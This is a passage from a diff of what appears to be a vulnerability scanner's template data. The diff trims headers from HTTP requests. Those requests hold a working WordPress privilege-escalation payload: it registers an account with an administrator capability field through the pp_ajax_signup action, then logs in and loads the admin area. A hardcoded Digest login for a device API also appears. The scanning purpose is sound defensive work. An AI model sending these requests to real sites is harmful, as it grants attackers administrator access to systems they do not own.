-            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0\nAccept: application/json, text/javascript, */*; q=0.01\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------138742543134772812001999326589\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\nConnection: close\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_username\"\n\n{{randstr}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_email\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password_present\"\n\ntrue\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_first_name\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_last_name\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"_wp_http_referer\"\n\n/wp/?page_id=18\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"pp_current_url\"\n\n{{BaseURL}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"wp_capabilities[administrator]\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_form_id\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_referrer_page\"\n\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"action\"\n\npp_ajax_signup\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"melange_id\"\n\n\n-----------------------------138742543134772812001999326589--\n",
-            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\nConnection: close\n\nlog={{randstr}}@example.com&pwd={{randstr}}@example.com&wp-submit=Log+In\n",
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: multipart/form-data; boundary=---------------------------138742543134772812001999326589\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_username\"\n\n{{randstr}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_email\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_password_present\"\n\ntrue\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_first_name\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"reg_last_name\"\n\n{{randstr}}@example.com\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"_wp_http_referer\"\n\n/wp/?page_id=18\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"pp_current_url\"\n\n{{BaseURL}}\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"wp_capabilities[administrator]\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_form_id\"\n\n1\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"signup_referrer_page\"\n\n\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"action\"\n\npp_ajax_signup\n-----------------------------138742543134772812001999326589\nContent-Disposition: form-data; name=\"melange_id\"\n\n\n-----------------------------138742543134772812001999326589--\n",
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/javascript, */*; q=0.01\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\n\nlog={{randstr}}@example.com&pwd={{randstr}}@example.com&wp-submit=Log+In\n",
             "GET /wp-admin/ HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: close\n"
           ]
         }
@@ -26873,8 +26972,7 @@
         {
           "headers": {
             "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "matchers": [
             {
